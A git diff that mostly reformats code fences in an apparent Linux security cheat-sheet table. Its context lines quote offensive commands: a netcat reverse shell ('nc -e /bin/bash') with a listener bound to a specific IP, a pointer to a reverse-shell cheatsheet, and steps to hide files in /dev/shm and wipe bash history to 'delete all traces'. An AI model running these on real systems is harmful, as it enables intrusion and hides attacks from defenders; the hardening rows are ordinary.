@@ -632,7 +632,9 @@ $ for i in {1..10}; do firefox -new-window "hhtp://www.saikia.one/" ; done <br /
 <th>Clear the Logs & History on Linux Systems to Delete All Traces</th>
 <td>clear logs and history<br /></td>
 <td>
-```
+
+```bash
+
 $ find / -perm -222 -type d 2>/dev/user (all dir with write permission)
 $ mkdir /dev/shm/.secret
 $ ls /dev/shm
@@ -658,7 +660,8 @@ $ >.bash_history (it will clear the file)
 <th>Audit & Lock Down Your System</th>
 <td>with lynis<br /></td>
 <td>
-```
+
+```bash
 $ sudo wget 'https://github.com/CISOfy/lynis/archive/master.zip'
 $ sudo unzip
 $ cd lynis-master
@@ -678,11 +681,11 @@ $ source ~/.bashrc
 $ make
 $ sudo make install
 $ sudo systemctl enable opensnitchd
-
 system logs:
 $ find /var/log/ -type f \( -name "*.log" \) -exec tail -f "$file" {} +
 
 ```
+
 <br /></td>
 </tr>
 
@@ -698,6 +701,7 @@ $ nc -e /bin/bash source_ip 87 (port 87) <br />
 We want the above script to be installed in the machine and executed.<br />
 In windows: using [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) <br />
 (server side) $ stty raw -echo; (stty size; cat) | nc -lvnp 87 -s 69.164.204.158 <br />
+
 (client side) $ command [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)<br />
 <br /></td>
 </tr>
